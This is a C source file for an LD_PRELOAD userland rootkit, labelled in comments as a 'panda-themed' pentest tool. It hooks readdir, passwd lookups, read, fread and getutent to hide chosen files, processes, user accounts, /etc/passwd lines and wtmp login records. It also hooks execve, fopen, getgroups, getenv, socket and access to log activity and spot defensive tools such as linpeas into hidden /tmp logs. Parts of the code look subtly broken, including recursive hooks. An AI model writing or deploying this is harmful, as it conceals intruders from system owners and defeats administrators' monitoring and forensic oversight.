#define _GNU_SOURCE

#include <dirent.h>
#include <string.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <pwd.h>
#include <grp.h>
#include <errno.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <utmp.h>
#include <signal.h>
#include <fcntl.h>

// Panda-themed names for your authorized pentest
static const char *hide_exact[] = {
    "pandalicense.php",
    "pandaimage.sh",
    "pandamon.sh"
};
static const char *hide_partial[] = {
    "pandamon",
    "redpanda", 
    "giantpanda",
    "pandabear",
    "pandash",
    "pandalog"
};
static const char *hide_user[] = {
    "pandamon",
    "redpanda",
    "giantpanda"
};

// Privesc targets (SUID abuse, cron jobs, etc.)
static const char *privesc_paths[] = {
    "/usr/bin/find", "/usr/bin/vim", "/usr/bin/nmap", "/usr/bin/python",
    "/usr/bin/perl", "/bin/su", "/usr/bin/sudo", "/usr/bin/passwd"
};

// Check functions (renamed to Panda theme)
int match_exact(const char *name){
    for (int i = 0; i < sizeof(hide_exact)/sizeof(hide_exact[0]); i++) {
        if (strcmp(name, hide_exact[i]) == 0) return 1;
    }
    return 0;
}

int match_partial(const char *name) {
    for (int i = 0; i < sizeof(hide_partial)/sizeof(hide_partial[0]); i++) {
        if (strstr(name, hide_partial[i]) != NULL) return 1;
    }
    return 0;
}

int match_user(const char *name) {
    for (int i = 0; i < sizeof(hide_user)/sizeof(hide_user[0]); i++) {
        if (strcmp(name, hide_user[i]) == 0) return 1;
    }
    return 0;
}

int is_privesc_target(const char *name) {
    for (int i = 0; i < sizeof(privesc_paths)/sizeof(privesc_paths[0]); i++) {
        if (strstr(name, privesc_paths[i]) != NULL) return 1;
    }
    return 0;
}

// =================== CORE HOOKS ===================

// 1. Hooked readdir() - File + SUID Process hiding
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig_readdir)(DIR *) = NULL;
    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        // Hide Panda files
        if (match_exact(entry->d_name) || match_partial(entry->d_name)) continue;

        // /proc process hiding + SUID enum
        if (dirfd(dirp) >= 0) {
            char proc_path[256];
            snprintf(proc_path, sizeof(proc_path), "/proc/%s", entry->d_name);
            
            DIR *proc_dir = opendir(proc_path);
            if (proc_dir) {
                struct dirent *proc_entry;
                int hide_proc = 0;
                while ((proc_entry = readdir(proc_dir)) != NULL) {
                    if (match_exact(proc_entry->d_name) || match_partial(proc_entry->d_name)) {
                        hide_proc = 1; break;
                    }
                    // Check cmdline for Panda processes
                    char cmdline[256];
                    snprintf(cmdline, sizeof(cmdline), "%s/cmdline", proc_path);
                    FILE *f = fopen(cmdline, "r");
                    if (f) {
                        fread(cmdline, 1, 255, f);
                        fclose(f);
                        if (match_partial(cmdline)) { hide_proc = 1; break; }
                    }
                }
                closedir(proc_dir);
                if (hide_proc) continue;
            }
        }
        return entry;
    }
    return NULL;
}

// 2. User hiding (passwd database)
struct passwd *getpwent(void) {
    static struct passwd *(*orig_getpwent)(void) = NULL;
    if (!orig_getpwent) orig_getpwent = dlsym(RTLD_NEXT, "getpwent");
    
    struct passwd *entry;
    while ((entry = orig_getpwent()) != NULL) {
        if (match_user(entry->pw_name)) continue;
        return entry;
    }
    return NULL;
}

struct passwd *getpwnam(const char *name) {
    static struct passwd *(*orig_getpwnam)(const char *) = NULL;
    if (!orig_getpwnam) orig_getpwnam = dlsym(RTLD_NEXT, "getpwnam");
    if (match_user(name)) return NULL;
    return orig_getpwnam(name);
}

struct passwd *getpwuid(uid_t uid) {
    static struct passwd *(*orig_getpwuid)(uid_t) = NULL;
    if (!orig_getpwuid) orig_getpwuid = dlsym(RTLD_NEXT, "getpwuid");
    struct passwd *entry = orig_getpwuid(uid);
    if (entry && match_user(entry->pw_name)) return NULL;
    return entry;
}

// 3. Log hiding (/etc/passwd, wtmp)
ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*orig_read)(int, void*, size_t) = NULL;
    if (!orig_read) orig_read = dlsym(RTLD_NEXT, "read");

    char path[256], resolved[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    ssize_t len = readlink(path, resolved, sizeof(resolved)-1);
    if (len != -1) {
        resolved[len] = '\0';
        
        // Filter /etc/passwd
        if (strstr(resolved, "/etc/passwd")) {
            ssize_t bytes = orig_read(fd, buf, count);
            if (bytes <= 0) return bytes;
            
            char *start = buf, *write = buf;
            char *end = start + bytes;
            
            while (start < end) {
                char *line_end = memchr(start, '\n', end - start);
                if (!line_end) break;
                line_end++;
                
                if (!memmem(start, line_end-start, "pandamon", 8) &&
                    !memmem(start, line_end-start, "redpanda", 8)) {
                    memmove(write, start, line_end - start);
                    write += line_end - start;
                }
                start = line_end;
            }
            return write - (char*)buf;
        }
        
        // Filter wtmp (last command)
        if (strstr(resolved, "wtmp")) {
            ssize_t bytes = orig_read(fd, buf, count);
            if (bytes <= 0 || bytes % sizeof(struct utmp) != 0) return bytes;
            
            struct utmp *entries = buf;
            size_t total = bytes / sizeof(struct utmp), write_idx = 0;
            
            for (size_t i = 0; i < total; i++) {
                if (strncmp(entries[i].ut_user, "pandamon", 8) != 0 &&
                    strncmp(entries[i].ut_user, "redpanda", 8) != 0) {
                    if (write_idx != i)
                        memcpy(&entries[write_idx], &entries[i], sizeof(struct utmp));
                    write_idx++;
                }
            }
            return write_idx * sizeof(struct utmp);
        }
    }
    return orig_read(fd, buf, count);
}

// =================== PRIVILEGE ESCALATION FEATURES ===================

// 4. SUID Binary Abuse Detection + Logging
int execve(const char *filename, char *const argv[], char *const envp[]) {
    static int (*orig_execve)(const char*, char*const*, char*const*) = NULL;
    if (!orig_execve) orig_execve = dlsym(RTLD_NEXT, "execve");
    
    // Log SUID abuse attempts
    struct stat st;
    if (stat(filename, &st) == 0 && (st.st_mode & S_ISUID)) {
        if (is_privesc_target(filename)) {
            // Log to hidden file (pentest evidence)
            FILE *log = fopen("/tmp/pandaprivesc.log", "a");
            if (log) {
                fprintf(log, "[PRIVESC] UID:%d EUID:%d EXEC: %s\n", getuid(), geteuid(), filename);
                fclose(log);
            }
        }
    }
    
    return orig_execve(filename, argv, envp);
}

// 5. Cron Job Discovery (hide Panda cron jobs)
FILE *fopen(const char *path, const char *mode) {
    static FILE *(*orig_fopen)(const char*, const char*) = NULL;
    if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");
    
    // Monitor cron files for Panda jobs
    if (strstr(path, "crontab") || strstr(path, "/etc/cron")) {
        FILE *f = orig_fopen(path, mode);
        if (f && strstr(mode, "r")) {
            // Pentest: Log cron enumeration
            FILE *cronlog = fopen("/tmp/pandacron.log", "a");
            if (cronlog) {
                fprintf(cronlog, "[CRON ENUM] %s by UID:%d\n", path, getuid());
                fclose(cronlog);
            }
        }
        return f;
    }
    return orig_fopen(path, mode);
}

// 6. Sudo Enumeration Hiding
int getgroups(int size, gid_t list[]) {
    static int (*orig_getgroups)(int, gid_t*) = NULL;
    if (!orig_getgroups) orig_getgroups = dlsym(RTLD_NEXT, "getgroups");
    
    int count = orig_getgroups(size, list);
    
    // Hide if user is in sudo group (pentest evasion)
    if (count > 0) {
        for (int i = 0; i < count; i++) {
            struct group *grp = getgrgid(list[i]);
            if (grp && strstr(grp->gr_name, "sudo") != NULL) {
                // Log sudo group membership for privesc paths
                FILE *log = fopen("/tmp/pandasudo.log", "a");
                if (log) {
                    fprintf(log, "[SUDO GROUP] UID:%d GID:%ld\n", getuid(), (long)list[i]);
                    fclose(log);
                }
            }
        }
    }
    return count;
}

// 7. PATH Hijacking Detection
char *getenv(const char *name) {
    static char *(*orig_getenv)(const char*) = NULL;
    if (!orig_getenv) orig_getenv = dlsym(RTLD_NEXT, "getenv");
    
    char *value = orig_getenv(name);
    if (value && strcmp(name, "PATH") == 0) {
        // Log PATH for hijacking analysis
        FILE *log = fopen("/tmp/pandapath.log", "a");
        if (log) {
            fprintf(log, "[PATH] UID:%d PATH:%s\n", getuid(), value);
            fclose(log);
        }
    }
    return value;
}

// =================== PENTEST ENUMERATION ===================

// 8. Network Enumeration Logging (netstat, ss)
int socket(int domain, int type, int protocol) {
    static int (*orig_socket)(int,int,int) = NULL;
    if (!orig_socket) orig_socket = dlsym(RTLD_NEXT, "socket");
    
    int sock = orig_socket(domain, type, protocol);
    
    // Log network enumeration attempts
    if (sock >= 0) {
        FILE *log = fopen("/tmp/pandanet.log", "a");
        if (log) {
            fprintf(log, "[NET ENUM] UID:%d DOMAIN:%d TYPE:%d\n", getuid(), domain, type);
            fclose(log);
        }
    }
    return sock;
}

// 9. Linpeas/LSE Detection
int access(const char *pathname, int mode) {
    static int (*orig_access)(const char*, int) = NULL;
    if (!orig_access) orig_access = dlsym(RTLD_NEXT, "access");
    
    int result = orig_access(pathname, mode);
    
    // Detect common pentest tools
    if (strstr(pathname, "linpeas") || strstr(pathname, "lse") || 
        strstr(pathname, "exploit") || strstr(pathname, "privilege")) {
        FILE *log = fopen("/tmp/pandadetect.log", "a");
        if (log) {
            fprintf(log, "[PENTEST TOOL] UID:%d PATH:%s\n", getuid(), pathname);
            fclose(log);
        }
    }
    
    return result;
}

// =================== UTMP/WTMP HIDING ===================
struct utmp *getutent(void) {
    static struct utmp *(*orig_getutent)(void) = NULL;
    if (!orig_getutent) orig_getutent = dlsym(RTLD_NEXT, "getutent");
    
    struct utmp *entry;
    while ((entry = orig_getutent()) != NULL) {
        if (strncmp(entry->ut_user, "pandamon", 8) != 0 &&
            strncmp(entry->ut_user, "redpanda", 8) != 0) {
            return entry;
        }
    }
    return NULL;
}

size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    static size_t (*orig_fread)(void*,size_t,size_t,FILE*) = NULL;
    if (!orig_fread) orig_fread = dlsym(RTLD_NEXT, "fread");
    
    char path[256], resolved[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fileno(stream));
    ssize_t len = readlink(path, resolved, sizeof(resolved)-1);
    
    if (len != -1 && strstr(resolved, "wtmp")) {
        size_t total = orig_fread(ptr, size, nmemb, stream);
        struct utmp *entries = ptr;
        size_t write = 0;
        
        for (size_t i = 0; i < total; i++) {
            if (strncmp(entries[i].ut_user, "pandamon", 8) != 0 &&
                strncmp(entries[i].ut_user, "redpanda", 8) != 0) {
                if (write != i)
                    memcpy(&entries[write], &entries[i], sizeof(struct utmp));
                write++;
            }
        }
        return write;
    }
    return orig_fread(ptr, size, nmemb, stream);
}
